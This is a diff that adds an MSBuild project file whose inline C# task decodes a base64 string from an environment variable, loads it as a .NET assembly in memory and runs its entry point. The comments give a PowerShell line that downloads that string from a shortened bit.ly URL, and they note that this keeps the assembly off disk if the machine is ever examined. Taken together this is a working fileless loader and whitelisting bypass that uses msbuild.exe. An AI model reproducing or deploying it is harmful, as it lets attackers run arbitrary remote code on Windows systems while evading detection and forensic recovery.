@@ -1,0 +1,34 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuilder.xml -->
+  <!-- Populate the Env Var like this or many other ways: -->
+  <!-- $env:TheThingIs = (New-Object Net.Webclient).downloadstring('http://bit.ly/2upfWm0') -->
+  <!-- This has the advantage of keeping the assembly out of the xml on disk if it were ever recovered -->
+  <!-- This is just a simple example... MSBuild is a rich scripting engine with lots of abiltiy to customize the build process -->
+  <Target Name="Hello">
+    <SharpLauncher >
+    </SharpLauncher>
+  </Target>
+  <UsingTask
+    TaskName="SharpLauncher"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+      <Using Namespace="System.Reflection" />
+       
+      <Code Type="Fragment" Language="cs">
+        <![CDATA[
+            string s = $(TheThingIs)
+            byte[] b = System.Convert.FromBase64String(s);
+            Assembly a = Assembly.Load(b);
+            MethodInfo method = a.EntryPoint;
+            object o = a.CreateInstance(method.Name);
+            method.Invoke(o, null);
+             
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
